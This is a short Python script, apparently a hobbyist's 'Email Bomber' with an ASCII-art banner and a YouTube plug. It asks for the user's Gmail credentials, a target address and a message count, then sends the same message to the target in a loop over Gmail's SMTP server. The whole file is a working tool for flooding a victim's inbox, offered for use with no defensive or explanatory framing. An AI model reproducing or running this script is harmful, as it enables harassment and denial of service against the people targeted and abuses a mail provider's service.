# Coded By Sudo
import smtplib
import getpass
from email.mime.text import MIMEText

print("\033[1;32;40m\n""""{}
 _______  __   __  ______   _______  _______           
|       ||  | |  ||      | |       ||       |          
|  _____||  | |  ||  _    ||   _   ||  _____|          
| |_____ |  |_|  || | |   ||  | |  || |_____           
|_____  ||       || |_|   ||  |_|  ||_____  |          
 _____| ||       ||       ||       | _____| |          
|_______||_______||______| |_______||_______|          
 _______  __   __  _______  ___   ___                  
|       ||  |_|  ||   _   ||   | |   |                 
|    ___||       ||  |_|  ||   | |   |                 
|   |___ |       ||       ||   | |   |                 
|    ___||       ||       ||   | |   |___              
|   |___ | ||_|| ||   _   ||   | |       |             
|_______||_|   |_||__| |__||___| |_______|             
 _______  _______  __   __  _______  _______  ______   
|  _    ||       ||  |_|  ||  _    ||       ||    _ |  
| |_|   ||   _   ||       || |_|   ||    ___||   | ||  
|       ||  | |  ||       ||       ||   |___ |   |_||_ 
|  _   | |  |_|  ||       ||  _   | |    ___||    __  |
| |_|   ||       || ||_|| || |_|   ||   |___ |   |  | |
|_______||_______||_|   |_||_______||_______||___|  |_|
                                                                                                                                   
{}\n\t[+] Welcome To Sudos's Email Bomber (•◡ •) /\n\t[+] *Ctrl + c To Stop*\n\t[+] Subscribe To Sudo On YT\n{}""".format("="*100,"="*100,"="*100))

server = smtplib.SMTP_SSL("smtp.gmail.com", 465)

try:
    emaillogin = input("[+] Enter Your Email Here --> ")
    passwordlogin = getpass.getpass("[+] Enter Your Password Here --> ")
    email = input("[+] Enter Your Targets Email Here --> ")
    emailnum = int(input("[+] Enter The Number Of Emails You Want To Send Here --> "))
    sub = input("[+] Enter Your Subject Here --> ")
    message = input("[+] Enter Your Message Here --> ")
    print("="*100)
    
    for i in range(0, emailnum):
        msg = MIMEText(f"{message}")
        msg['Subject'] = f'{sub}'
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(f"{emaillogin}", f"{passwordlogin}")
        receivers = [f"{email}"]
        server.sendmail(f"{emaillogin}", receivers, msg.as_string())
        print("[+] Message Sent")

except smtplib.SMTPAuthenticationError:
	print("\n[+] Either Your Email Or Password Is Incorrect Or Enable Less Secure Apps\n[+] Exiting...\n")

except smtplib.SMTPRecipientsRefused:
	print("\n[+] Your Targets Email Is Incorrect Try Again\n[+] Exiting...\n")

except ValueError:
	print("\n[+] The Number Of Emails You Requested To Send Is Invalid\n[+] Exiting...\n")

except KeyboardInterrupt:
    print("\n[+] Exiting...\n")

server.quit()
